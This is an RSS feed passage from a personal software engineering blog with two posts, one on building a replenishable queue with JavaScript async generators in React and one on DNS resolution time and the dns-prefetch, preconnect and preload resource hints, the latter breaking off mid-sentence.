<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Alex MacArthur&apos;s Blog</title><description>I&apos;m Alex MacArthur, a software engineer bossing around computers in made-up languages.</description><link>https://macarthur.me/</link><language>en-us</language><item><title>I used a generator to build a replenishable queue.</title><link>https://macarthur.me/posts/queue</link><guid isPermaLink="true">https://macarthur.me/posts/queue</guid><pubDate>Mon, 12 Jan 2026 03:45:24 GMT</pubDate><content:encoded>&lt;p&gt;Ever since &lt;a href=&quot;https://macarthur.me/posts/generators/?ref=cms.macarthur.me&quot;&gt;writing about them&lt;/a&gt;, the generator in JavaScript has become my favorite hammer. I&apos;ll wield it nearly any chance I can get it. Usually, that looks like rolling through a finite batch of items over time. For example, doing something with a bunch of leap years:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;function* generateYears(start = 1900) {
  const currentYear = new Date().getFullYear();
  
  for (let year = start + 1; year &amp;lt;= currentYear; year++) {
    if (isLeapYear(year)) {
      yield year;
    }
  }
}

for (const year of generateYears()) {
  console.log(&apos;the next leap year is:&apos;, year);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;...or lazily processing some files:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const csvFiles = [&quot;file1.csv&quot;, &quot;file2.csv&quot;, &quot;file3.csv&quot;];

function *processFiles(files) {
  for (const file of files) {
    // load and process files
    yield `the result for: ${file}`;
  }
}

for(const result of processFiles(csvFiles)) {
  console.log(result);
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In both examples, the pool of items is exhausted &lt;em&gt;once&lt;/em&gt; and never replenished. The &lt;code&gt;for&lt;/code&gt; loop stops, and the final item returned by the iterator contains &lt;code&gt;done: true&lt;/code&gt;. C’est fini.&lt;/p&gt;&lt;p&gt;That behavior makes sense – a generator wasn’t designed to be resurrected after it&apos;s completed. It’s a one-way street. But on at least one occasion, I&apos;ve wanted it to be possible. Most recently, it happened while building a file upload tool for &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt;. I wanted (read: demanded) to use a generator to power a replenishable, first-in-first-out (FIFO) queue. I did some tinkering, and liked where the effort ended up. &lt;/p&gt;&lt;h2&gt;The Makeup of a Replenishable Queue&lt;/h2&gt;&lt;p&gt;First, a bit more on what I mean by “replenishable.” A generator can&apos;t be turned on again, but we can get around that by &lt;em&gt;holding it open&lt;/em&gt; when the queue of items becomes depleted. A great job for promises!&lt;/p&gt;&lt;p&gt;Let&apos;s start with this setup: dots in a queue that are individually processed every 500ms. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
  &amp;lt;ul id=&quot;queue&quot;&amp;gt;
    &amp;lt;li class=&quot;item&quot;&amp;gt;&amp;lt;/li&amp;gt;
    &amp;lt;li class=&quot;item&quot;&amp;gt;&amp;lt;/li&amp;gt;
    &amp;lt;li class=&quot;item&quot;&amp;gt;&amp;lt;/li&amp;gt;
  &amp;lt;/ul&amp;gt;

  total processed: &amp;lt;span id=&quot;totalProcessed&quot;&amp;gt;0&amp;lt;/span&amp;gt;
&amp;lt;/html&amp;gt;

&amp;lt;script&amp;gt;
  async function* go() {
    // A queue with some initial items.
    const queue = Array.from(document.querySelectorAll(&quot;#queue .item&quot;));

    for (const item of queue) {
      yield item;
    }
  }

  // Iterate over each one, removing along the way.
  for await (const value of go()) {
    await new Promise((res) =&amp;gt; setTimeout(res, 500));
    value.remove();

    totalProcessed.textContent = Number(totalProcessed.textContent) + 1;
  }
&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here&apos;s our one-way queue:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/12/CleanShot-2025-12-06-at-15.40.42.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;800&quot; height=&quot;295&quot; /&gt;&lt;/figure&gt;&lt;p&gt;If we had a button for pushing items to the queue, and it were clicked &lt;em&gt;after&lt;/em&gt; the generator had completed, nothing would happen. It&apos;s dead. So, let&apos;s do some refactoring.&lt;/p&gt;&lt;h3&gt;Making It Replenishable&lt;/h3&gt;&lt;p&gt;First, we&apos;ll allow the loop to run indefinitely using &lt;code&gt;while(true)&lt;/code&gt;, rather than directly depending on whatever&apos;s available in the queue.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;async function* go() {
  const queue = Array.from(document.querySelectorAll(&quot;#queue .item&quot;));

  while (true) {
    if (!queue.length) {
      return;
    }

    yield queue.shift();
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The one remaining problem is that &lt;code&gt;return&lt;/code&gt; statement. We&apos;ll replace it with a promise to pause the loop until we have more items to process:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;let resolve = () =&amp;gt; {};
const queue = Array.from(document.querySelectorAll(&apos;#queue .item&apos;));

async function* go() {  
  while (true) {
    // Create a promise &amp;amp; set our 
    // resolver for this iteration of the generator.
    const promise = new Promise((res) =&amp;gt; (resolve = res));
    
    // No items... wait until our promise is resolved.
    if (!queue.length) await promise;

    yield queue.shift();
  }
}

addToQueueButton.addEventListener(&quot;click&quot;, () =&amp;gt; {
  const newElement = document.createElement(&quot;li&quot;);
  newElement.classList.add(&quot;item&quot;);
  queueElement.appendChild(newElement);

  // Add new item and reignite the queue!
  queue.push(newElement);
  resolve();
});

// ...the rest of the code.&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This time around, a new promise is created for every item. If there aren&apos;t any items to process, that promise will be &lt;code&gt;await&lt;/code&gt;-ed until some indeterminate point in the future. For us, that&apos;s whenever the button is clicked, adding a new item to the queue. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/12/CleanShot-2025-12-06-at-15.41.44.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot; width=&quot;800&quot; height=&quot;357&quot; /&gt;&lt;/figure&gt;&lt;p&gt;For some finishing touches, let&apos;s put it behind a prettier API. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;function buildQueue&amp;lt;T&amp;gt;(queue: T[] = []) {
  let resolve: VoidFunction = () =&amp;gt; {};

  async function* go() {
    while (true) {
      const promise = new Promise((res) =&amp;gt; (resolve = res));
      
      if (!queue.length) await promise;

      yield queue.shift();
    }
  }

  function push(items: T[]) {
    queue.push(...items);

    resolve();
  }

  return {
    go,
    push,
  };
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;One quick call-out about this: you don&apos;t &lt;em&gt;have&lt;/em&gt; to discard every item from the queue. If you&apos;d like them all to stick around, just pivot to a version using a pointer:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;async function* go() {
  let currentIndex = 0;

  while (true) {
    const promise = new Promise((res) =&amp;gt; (resolve = res));

    if (!queue[currentIndex]) await promise;

    yield queue[currentIndex];
    currentIndex++;
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Good job, us! Now, let&apos;s head back to the real world. &lt;/p&gt;&lt;h2&gt;Using It In React&lt;/h2&gt;&lt;p&gt;Like I mentioned, &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;PicPerf&lt;/a&gt; allows you to upload a bunch of images to be optimized, hosted, and cached. The UI follows a common pattern: drag things in and they&apos;ll get progressively uploaded.&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/09/CleanShot-2025-09-21-at-17.14.55@2x.png&quot; alt=&quot;PicPerf&apos;s upload UI&quot; loading=&quot;lazy&quot; width=&quot;1558&quot; height=&quot;904&quot; /&gt;&lt;/figure&gt;&lt;p&gt;This is where I wanted my first-in-first-out queue. If the pool of ”pending” images has been depleted, I should still be able to drag in &lt;em&gt;more &lt;/em&gt;images and see the process continue. The queue would simply pick back up with the new set of items.&lt;/p&gt;&lt;h3&gt;Building it in React&lt;/h3&gt;&lt;p&gt;First, let&apos;s try our hand with a React-first approach. We&apos;ll lean hard into React&apos;s state + render lifecycle, depending on two pieces of state: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;files: UploadedFile[]&lt;/code&gt; - this represents every file dragged into the UI. Each of these items manages its own status: &lt;code&gt;pending&lt;/code&gt;, &lt;code&gt;uploading&lt;/code&gt;, or &lt;code&gt;completed&lt;/code&gt;. &lt;/li&gt;&lt;li&gt;&lt;code&gt;isUploading: boolean&lt;/code&gt; - a flag for storing whether we&apos;re currently uploading a file. This&apos;ll be used as a lock, preventing another upload loop from beginning while there&apos;s one already in progress. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;This version of the component works by watching whether anything has been added to &lt;code&gt;files&lt;/code&gt;. As soon as it gets something, &lt;code&gt;useEffect()&lt;/code&gt; kicks off the upload process. Toggling &lt;code&gt;isUploading&lt;/code&gt; back to &lt;code&gt;false&lt;/code&gt; will trigger &lt;em&gt;another&lt;/em&gt; effect, causing the &lt;em&gt;next&lt;/em&gt; image in the queue to be handled. &lt;/p&gt;&lt;p&gt;Here&apos;s a stripped down, contrived example of how it&apos;s structured.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { processUpload } from &apos;./wherever&apos;;

export default function MediaUpload() {
  const [files, setFiles] = useState([]);
  const [isUploading, setIsUploading] = useState(false);

  const updateFileStatus = useEffectEvent((id, status) =&amp;gt; {
    setFiles((prev) =&amp;gt;
      prev.map((file) =&amp;gt; (file.id === id ? { ...file, status } : file))
    );
  });

  useEffect(() =&amp;gt; {
    if (isUploading) return;

    const nextPending = files.find((f) =&amp;gt; f.status === &apos;pending&apos;);
    
    if (!nextPending) return;

    setIsUploading(true);
    updateFileStatus(nextPending.id, &apos;uploading&apos;);

    processUpload(nextPending).then(() =&amp;gt; {
      updateFileStatus(nextPending.id, &apos;complete&apos;);
      setIsUploading(false);
    });
  }, [files, isUploading]);

  return &amp;lt;UploadComponent files={files} setFiles={setFiles} /&amp;gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;While there&apos;s an outstanding upload, we&apos;re still fully able to add &lt;em&gt;new&lt;/em&gt; &lt;code&gt;files&lt;/code&gt; as we wait. They&apos;ll just be tacked onto the overall list, and processed incrementally:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/09/CleanShot-2025-09-21-at-20.30.04.gif&quot; alt=&quot;example of the final upload component&quot; loading=&quot;lazy&quot; width=&quot;800&quot; height=&quot;479&quot; /&gt;&lt;/figure&gt;&lt;p&gt;In terms of React component design, this isn&apos;t the &lt;em&gt;worst&lt;/em&gt; tactic in the world. It&apos;s common to listen for state changes like this, and then respond accordingly. &lt;/p&gt;&lt;p&gt;Still... I think you&apos;d be hard-pressed to find an honest person who finds the approach intuitive. The &lt;code&gt;useEffect()&lt;/code&gt; hook is intended to &lt;a href=&quot;https://react.dev/reference/react/useEffect?ref=cms.macarthur.me&quot;&gt;synchronize a component with an external system&lt;/a&gt;. But this is acting more like an event-driven state machine orchestration thing. That hook is &lt;em&gt;core&lt;/em&gt; to the behavior of the component. &lt;/p&gt;&lt;p&gt;Let&apos;s remedy that by swapping out all those effects for a generator-powered queue. &lt;/p&gt;&lt;h2&gt;Syncing to an External Store&lt;/h2&gt;&lt;p&gt;Rather than allowing React to own the entire list of files and their statuses, we&apos;ll pull them out and signal re-renders to occur from a different location. That&apos;ll make our component a little more &quot;dumb&quot; and focused on what its ultimate purpose is: render some UI.&lt;/p&gt;&lt;p&gt;To do this, &lt;a href=&quot;https://react.dev/reference/react/useSyncExternalStore?ref=cms.macarthur.me&quot;&gt;React comes with a tool&lt;/a&gt; that fits our circumstances nicely: &lt;code&gt;useSyncExternalStore()&lt;/code&gt;. This enables a component to listen for changes to &lt;em&gt;data managed elsewhere&lt;/em&gt;. In a way, the &quot;React-ness&quot; of the component takes a bit of a backseat and waits for instructions from afar, rather than wholly owning the state itself. In our case, the &quot;external store&quot; will be a separate module responsible for processing our files.&lt;/p&gt;&lt;p&gt;At bare minimum, &lt;code&gt;useSyncExternalStore()&lt;/code&gt; requires two functions: one for listening for changes to the relevant data (used to know when a component relying on the store should be re-rendered), and another for returning the latest version of that data. Here&apos;s our skeleton:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// store.ts

let listeners: Function[] = [];
let files: UploadableFile[] = [];

// *Must* return a function for unsubscribing the listener. 
// (Used internally by React.)
export function subscribe(listener: Function) {
  listeners.push(listener);

  return () =&amp;gt; {
    listeners = listeners.filter((l) =&amp;gt; l !== listener);
  };
}

export function getSnapshot() {
  return files;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, let&apos;s quickly fill in the other functions needed to make this work:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;updateStatus()&lt;/code&gt; - Used to set whether a file is waiting, being currently uploaded, or finished.&lt;/li&gt;&lt;li&gt;&lt;code&gt;add()&lt;/code&gt; - Places new files onto the queue. &lt;/li&gt;&lt;li&gt;&lt;code&gt;process()&lt;/code&gt; - Kicks everything off and runs through the queue.&lt;/li&gt;&lt;li&gt;&lt;code&gt;emitChange()&lt;/code&gt; - Tells React&apos;s listeners that a change has occurred and components should be updated. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;In all, here&apos;s the state of the store:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// store.ts

import { buildQueue, processUpload } from &apos;./whatever&apos;;

let listeners: Function[] = [];
let files: any[] = [];
const queue = buildQueue();

function emitChange() {
  // Quirk of using an external store: 
  // our `files` must point to a new 
  // reference when a change occurs.
  files = [...queue.queue];

  for (let listener of listeners) {
    listener();
  }
}

function updateStatus(file: any, status: string) {
  file.status = status;
  emitChange();
}

// ===
// &quot;Public&quot; functions: 
// ===

export function getSnapshot() {
  return files;
}

export function subscribe(listener: Function) {
  listeners.push(listener);

  return () =&amp;gt; {
    listeners = listeners.filter((l) =&amp;gt; l !== listener);
  };
}

export function add(newFiles: any[]) {
  queue.push(newFiles);
  emitChange();
}

export async function process() {
  for await (const file of queue.go()) {
    updateStatus(file, &apos;uploading&apos;);

    await processUpload(file);

    updateStatus(file, &apos;complete&apos;);
  }
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, our component can take on a different shape:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;import { 
  add,
  process, 
  subscribe,
  getSnapshot
} from &apos;./store&apos;;

export default function MediaUpload() {
  const files = useSyncExternalStore(subscribe, getSnapshot);

  useEffect(() =&amp;gt; {
    process();
  }, []);

  return &amp;lt;UploadComponent files={files} setFiles={add} /&amp;gt;;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There&apos;s just one piece we&apos;re missing: proper clean-up. In the event that the component unmounts, we don&apos;t want any lingering upload processes. Let&apos;s add an &lt;code&gt;abort()&lt;/code&gt; method to force the generator to wrap up, and stick it into our &lt;code&gt;useEffect()&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;// store.ts

// ...other stuff.

let iterator = null;

export async function process() {
  iterator = queue.go();

  for await (const file of iterator) {
    updateStatus(file, &apos;uploading&apos;);

    await processUpload(file);

    updateStatus(file, &apos;complete&apos;);
  }

  iterator = null;
}

export function abort() {
  return iterator?.return();
}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;function MediaUpload() {
  const files = useSyncExternalStore(subscribe, getSnapshot);

  useEffect(() =&amp;gt; {
    process();

    return () =&amp;gt; abort();
  }, []);

  return &amp;lt;UploadComponent files={files} setFiles={add} /&amp;gt;;
}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;There are some bold assumptions we&apos;re making here for the sake of simplicity, by the way. Among them: the upload process will never fail, &lt;code&gt;process()&lt;/code&gt; will only ever be called once at a time, and there&apos;s only one user of the store). Forgive all those things and whatever else I might&apos;ve missed. The point is the bag of gains we get from this approach: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;The component&apos;s behavior no longer relies on repeated &lt;code&gt;useEffect()&lt;/code&gt; triggers. &lt;/li&gt;&lt;li&gt;All the file upload business is abstracted away into its own, React-free module. &lt;/li&gt;&lt;li&gt;You finally had a reason to leverage &lt;code&gt;useSyncExternalStore()&lt;/code&gt;.&lt;/li&gt;&lt;li&gt;We can gloat about how we implemented a replenishable queue with an async generator in React. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;To some, this probably feels &lt;em&gt;way more&lt;/em&gt; complicated than that &quot;React-ish&quot; route we initially took. I totally get that. But consider this: the more complicated we make our code &lt;em&gt;now&lt;/em&gt;, the longer we hold off AI agents from wholly displacing us, killing our futures, and harvesting our organs. Build with that in mind!&lt;/p&gt;&lt;p&gt;&lt;em&gt;But for real: for AI-assisted engineering to continue to be valuable, it&apos;ll need humans to help it understand the purposes, trade-offs, and futures of underlying primitives. There&apos;ll always be value in mastering that.&lt;/em&gt;&lt;/p&gt;</content:encoded></item><item><title>DNS Resolution Adds Up</title><link>https://macarthur.me/posts/dns</link><guid isPermaLink="true">https://macarthur.me/posts/dns</guid><pubDate>Tue, 11 Nov 2025 02:21:22 GMT</pubDate><content:encoded>&lt;p&gt;I like the satisfaction of finding quick, little wins to maximize the front-end performance of a website. Lately, they&apos;ve been found by digging through the modern browser&apos;s many &lt;a href=&quot;https://web.dev/learn/performance/resource-hints?ref=cms.macarthur.me&quot;&gt;resource hints&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;One in particular has caught my fancy: DNS prefetching. It hasn&apos;t enjoyed the same spotlight as hints like &lt;code&gt;preload&lt;/code&gt; in recent years, but it has a compelling advantage if the conditions are right – namely, if your site &lt;em&gt;could possibly&lt;/em&gt; interact with third-party domains at any point of a page visit. Thinking through those conditions could reap satisfying gains of your own, as well as get you more familiar with DNS resolution as a whole – a key, ubiquitous component of the web. That&apos;s time well-spent. Let&apos;s look at it a little more.&lt;/p&gt;&lt;h2&gt;DNS is Everything&lt;/h2&gt;&lt;p&gt;There&apos;s hard truth behind the &quot;it&apos;s always DNS&quot; meme that flares up every time there&apos;s a widespread network outage. It&apos;s a technology foundational to the web and yet inadvertently overlooked, making it real fun to catch when things go wrong. At a conceptual level, however, it&apos;s not the craziest thing to grasp. DNS is often reduced to being the &quot;phone book of the internet.” I think that&apos;s a great metaphor.&lt;/p&gt;&lt;p&gt;Let&apos;s map out a stupid-simple version of the process for a browser navigating to &lt;a href=&quot;https://picperf.io/?ref=cms.macarthur.me&quot;&gt;picperf.io&lt;/a&gt;: &lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;strong&gt;The user fires off a request to &lt;code&gt;picperf.io&lt;/code&gt; in the browser.&lt;/strong&gt; It looks clear enough, but the domain is actually a facade. PicPerf&apos;s origin server lives at an &lt;em&gt;IP address&lt;/em&gt; associated with that domain. &lt;em&gt;That&apos;s&lt;/em&gt; what the browser needs to direct the request. So, before moving forward, we gotta look it up.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;That lookup process begins by going to a recursive DNS server. &lt;/strong&gt;This is a sort of mediator between a client and the server holding the domain-to-IP association. For another metaphor, think of a recursive DNS server as the detective you task with chasing down the answer to a mystery.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;A subset of different DNS servers are used to find the &quot;source of truth&quot; server&lt;/strong&gt; containing all the records (&lt;code&gt;A&lt;/code&gt;, &lt;code&gt;TXT&lt;/code&gt;, &lt;code&gt;CNAME&lt;/code&gt;, etc.). It starts by resolving through the TLD, and works it&apos;s way up to the &lt;em&gt;authoritative server&lt;/em&gt;.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;The recursive DNS server kicks back the IP address to the browser.&lt;/strong&gt; The detective has done its job.&lt;/li&gt;&lt;li&gt;&lt;strong&gt;PicPerf&apos;s origin server receives a request and provides a response.&lt;/strong&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;Here, I made this diagram to help visualize this. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/11/CleanShot-2025-11-09-at-16.43.09@2x.png&quot; alt=&quot;DNS resolution diagram&quot; loading=&quot;lazy&quot; width=&quot;1812&quot; height=&quot;794&quot; /&gt;&lt;/figure&gt;&lt;p&gt;What&apos;s &lt;em&gt;not &lt;/em&gt;represented here, by the way, is the amount of caching and other complexity that occurs for lookups all the way from the browser up to the various servers. That&apos;s a gnarly rabbit hole we&apos;re not gonna bother with right now.&lt;/p&gt;&lt;h2&gt;It Really Can Add Up&lt;/h2&gt;&lt;p&gt;When a DNS record is in place and correctly configured, there isn&apos;t much to think about. Resolvers are smart and the process is pretty fast. But the typical website isn&apos;t just requesting resources from its own domain. There are often many, many third party domains in play, and those resolutions can add up, sometimes faster than you think. &lt;/p&gt;&lt;p&gt;I explored this on my own by using a Puppeteer script that loads a page, scrolls to the bottom, and adds up all the DNS resolution time for every asset it could inspect. Here are some of the results I got from a few sites after hitting them with a cold request. Bear in mind that none of this is scientific:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ebay.com: 6 distinct hosts, 117.47ms in total resolution time.&lt;/li&gt;&lt;li&gt;rd.com: 5 distinct hosts, 108.89ms in total resolution time.&lt;/li&gt;&lt;li&gt;msn.com: 12 distinct hosts, 306.56ms in total resolution time.&lt;/li&gt;&lt;li&gt;temu.com: 9 distinct hosts, 108.25ms in total resolution time&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Granted, aggregate numbers like this don&apos;t reveal the purpose or timing of those resolutions – only that they happened at some point after the page was accessed. But it illustrates that the cost of having your site reach out to multiple domains is more than zero. Let&apos;s wrap our heads around why that is with an example. &lt;/p&gt;&lt;p&gt;I loaded the same image from five different domains. &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;img src=&quot;https://picperf.io/img/4CAF9H/rat.jpg?1&quot; /&amp;gt;
&amp;lt;img src=&quot;https://images.macarthur.me/img/4CAF9H/rat.jpg?2&quot; /&amp;gt;
&amp;lt;img src=&quot;https://images.typeitjs.com/img/4CAF9H/rat.jpg?3&quot; /&amp;gt;
&amp;lt;img src=&quot;https://images.jamcomments.com/img/4CAF9H/rat.jpg?4&quot; /&amp;gt;
&amp;lt;img src=&quot;https://images.plausiblebootstrapper.com/img/4CAF9H/rat.jpg?5&quot; /&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When the page loads, the waterfall for those images looks something like this: &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/11/CleanShot-2025-11-09-at-18.47.40@2x.png&quot; alt=&quot;standard waterfall&quot; loading=&quot;lazy&quot; width=&quot;1822&quot; height=&quot;528&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Each color represents a different stage in the request lifecycle. The light blue color (second from the left) represents the DNS resolution phase. Each of these domains is distinct from the &lt;em&gt;page&apos;s&lt;/em&gt; domain, so each needs to go through this process. &lt;/p&gt;&lt;p&gt;For fresh requests like this, there isn&apos;t a whole lot we can or need to do to cut down on that lookup time. The browser&apos;s preload scanner already identifies those resources when the document is parsed, so it&apos;s able to kick off the requests very quickly. It&apos;s a little more complicated for late-discovered or lazily loaded resources, though. &lt;/p&gt;&lt;h2&gt;Get a Head Start w/ DNS Prefetching&lt;/h2&gt;&lt;p&gt;Let&apos;s change the page up a bit. Instead of immediately loading all of those images, we&apos;ll use JavaScript to lazily append them to the page after a few a second has passed. But not necessarily all of them. We&apos;ll flip a coin to determine if it&apos;ll render from that host:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;const hosts = [
  &quot;picperf.io&quot;,
  &quot;images.macarthur.me&quot;,
  &quot;images.jamcomments.com&quot;,
  &quot;images.plausiblebootstrapper.com&quot;,
  &quot;images.typeitjs.com&quot;,
];

function loadImage(host) {
  // Randomly load the image from this host.
  if (Math.random() &amp;lt; 0.5) return;
  
  const img = new Image();
  img.src = `https://${host}/img/4CAF9H/rat.jpg?${Math.random()}`;
  document.body.appendChild(img);
}

setTimeout(() =&amp;gt; hosts.map(loadImage), 1000);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Let&apos;s say that flip of a coin represents some indeterminate behavior on your page. It could be user input, network conditions, or a bajillion other things. The point is that the page &lt;em&gt;might&lt;/em&gt; communicate with a host, but it&apos;s not guaranteed.&lt;/p&gt;&lt;p&gt;This time, the browser&apos;s preload scanner can&apos;t immediately begin resolving anything. Every DNS resolution needs to wait until the request begins later on. You can see that in the selected window:&lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/11/CleanShot-2025-11-10-at-19.49.48@2x.png&quot; alt=&quot;waterfall with no dns-prefetching&quot; loading=&quot;lazy&quot; width=&quot;1896&quot; height=&quot;652&quot; /&gt;&lt;/figure&gt;&lt;p&gt;Since there&apos;s a chance every host &lt;em&gt;could&lt;/em&gt; be hit on any page load, we can get an affordable head start on resolving their DNS records (it&apos;s not an expensive process, so there&apos;s little to lose). We&apos;ll do that with a &lt;code&gt;dns-prefetch&lt;/code&gt; resource hint. One hint for each distinct domain we might interact with: &lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;head&amp;gt;
  &amp;lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://picperf.io&quot; /&amp;gt;
  &amp;lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://images.macarthur.me&quot; /&amp;gt;
  &amp;lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://images.jamcomments.com&quot; /&amp;gt;
  &amp;lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://images.plausiblebootstrapper.com&quot; /&amp;gt;
  &amp;lt;link rel=&quot;dns-prefetch&quot; href=&quot;https://images.typeitjs.com&quot; /&amp;gt;
&amp;lt;/head&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Now, take a look at our waterfall – the &quot;DNS Lookup&quot; phase has been virtually wiped out. &lt;/p&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/11/CleanShot-2025-11-10-at-19.47.03@2x.png&quot; alt=&quot;waterfall with dns-prefetching&quot; loading=&quot;lazy&quot; width=&quot;1876&quot; height=&quot;652&quot; /&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img src=&quot;https://cms.macarthur.me/content/images/2025/11/CleanShot-2025-11-10-at-19.47.31@2x.png&quot; alt=&quot;connection details for dns-prefetching&quot; loading=&quot;lazy&quot; width=&quot;1180&quot; height=&quot;392&quot; /&gt;&lt;/figure&gt;&lt;p&gt;By the time the browser was asked to request and load the images, it already had the respective IP addresses locked &amp;amp; loaded. No life-altering results here, but it does feel nice to make that waterfall a little slimmer.&lt;/p&gt;&lt;h2&gt;DNS Prefetching, Preconnecting, &amp;amp; Preloading&lt;/h2&gt;&lt;p&gt;They&apos;re not in focus here, but it&apos;s worth a minute to touch base on two other resource hints often used in the same conversation as DNS prefetching:  &lt;code&gt;preconnect&lt;/code&gt; and &lt;code&gt;preload&lt;/code&gt;. (The &lt;code&gt;prefetch&lt;/code&gt; hint may have also come to mind, there are still &lt;a href=&quot;https://caniuse.com/link-rel-prefetch?ref=cms.macarthur.me&quot;&gt;gaps in browser support&lt;/a&gt;, and &lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Attributes/rel/prefetch?ref=cms.macarthur.me#browser_compatibility&quot;&gt;it&apos;s recommended to reach for the Speculation Rules API&lt;/a&gt; in place of it anyway.)&lt;/p&gt;&lt;p&gt;Each of these three hints go a bit further in the request lifecycle: &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;dns-prefetch&lt;/code&gt;: Resolve the DNS and leave the rest to the browser. &lt;/li&gt;&lt;li&gt;&lt;code&gt;preconnect&lt;/code&gt;: Establish a full connection to the server (DNS resolution, TCP handshake, and TLS negotiation), and leave the rest to the browser. &lt;/li&gt;&lt;li&gt;&lt;code&gt;preload&lt;/code&gt;: Perform a full fetch of the resource, start to finish.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Each come with a different cost, so choosing between them highly depends on &lt;em&gt;how likely you are to need a late-discovered resource. &lt;/em&gt;Here&apos;s generally how you&apos;d navigate that decision:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Reach for &lt;code&gt;dns-prefetch&lt;/code&gt; &lt;strong&gt;if there&apos;s a chance you&apos;ll need resources&lt;/strong&gt; from an external domain, or if your site depends on a resources from a variety of third-party hosts. The hint is low-cost and good for getting an edge up on requests in the chance they&apos;re necessary. &lt;/li&gt;&lt;li&gt;Reach for &lt;code&gt;preconnect&lt;/code&gt; &lt;strong&gt;if you know the user will soon be downloading &lt;/strong&gt;resources from a domain. Opening up that connection in advance will help the browser cut to the chase when it&apos;s time to request something. Just don&apos;t get carried away. This is a more expensive process than &lt;code&gt;dns-prefetch&lt;/code&gt;, and there&apos;s no need to do it for resources within range of the browser&apos;s preload scanner (that is, referenced directly in your HTML). &lt;/li&gt;&lt;li&gt;Reach for &lt;code&gt;preload&lt;/code&gt; you&apos;re dealing with specific, high-priority resources that will certainly be downloaded sometime later in the page lifecycle. Fonts referenced in CSS is the go-to example here. &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Those rules aren&apos;t hard &amp;amp; fast, so leave room for a million different factors &amp;amp; circumstances. But when they&apos;re used appropriately, they can give you a nice bump. &lt;/p&gt;&lt;h3&gt;A Taste of &lt;code&gt;preconnect&lt;/code&gt; and &lt;code&gt;preload&lt;/code&gt;&lt;/h3&gt;&lt;p&gt;In light of all that, let&apos;s explore a little further. Say we know all of the images in our example would be downloaded &lt;em&gt;for sure. &lt;/em&gt;In this case, establishing a full connection with &lt;code&gt;preconnect&lt;/code&gt; is a good idea.&lt;em&gt; &lt;/em&gt;Here&apos;s a slight taste of how it would&apos;ve helped us out. Let&apos;s drop 